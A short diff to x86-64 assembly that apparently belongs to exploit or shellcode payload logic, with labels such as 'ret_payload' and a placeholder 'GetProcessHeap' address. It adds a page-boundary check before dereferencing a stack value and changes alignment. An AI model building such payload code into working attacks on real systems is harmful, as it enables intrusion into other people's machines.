@@ -21,6 +21,13 @@ pop rbx
 
 skip_free:
 mov rcx, QWORD [rsp]
+
+; cancer
+mov rdx, rcx
+and rdx, 0xfff
+cmp rdx, 0xff8
+jg done
+
 mov rcx, [rcx]
 mov rdx, QWORD [rel match_ret]
 
@@ -30,7 +37,7 @@ je ret_payload
 done:
 ret
 
-align 0x40
+align 0x80
 
 GetProcessHeap:
     dq   0x11223344556677
